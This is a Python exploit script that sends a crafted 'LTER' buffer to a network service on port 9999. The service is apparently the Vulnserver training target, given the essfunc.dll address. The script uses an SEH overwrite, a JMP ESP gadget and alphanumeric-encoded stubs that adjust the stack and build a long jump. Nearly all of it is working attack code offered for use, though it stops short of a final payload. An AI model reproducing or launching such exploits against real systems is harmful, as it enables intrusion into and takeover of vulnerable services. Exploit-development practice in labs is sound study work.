#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

nSeh = '\x54\x58\x74\x04' # push esp; pop eax; \x74 (JZ)
Seh  = '\x2b\x17\x50\x62' # 0x6250172B - JMP ESP - essfunc.dll
espAdj  = "\x54\x58\x66\x05\x30\x10\x66\x05\x7F\x01\x50\x5C\x66\x2D\x14\x7F\x50"
espAdj2 = "\x54\x58\x2C\x20\x50\x5C"

# 52 bytes long + 2 initial Bytes
longJump  = "\x54\x5B"
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
longJump += "\x05\x11\x11\x66\x52" ## add  eax, 0x52661111
longJump += "\x05\x11\x11\x55\x62" ## add  eax, 0x62551111
longJump += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
longJump += "\x50"                 ## push eax
longJump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
longJump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
longJump += "\x05\x41\x76\x53\x07" ## add  eax, 0x07537641
longJump += "\x05\x40\x75\x52\x06" ## add  eax, 0x06527540
longJump += "\x50"                 ## push eax


espAdj3 = "\x54\x58\x2C\x57\x50\x5C"

buffer = espAdj3
buffer += 'A' * (3399 - len(espAdj3))
buffer += espAdj2
buffer += longJump
buffer += 'A' * (3494 - len(buffer))
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += 'A' * (5000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

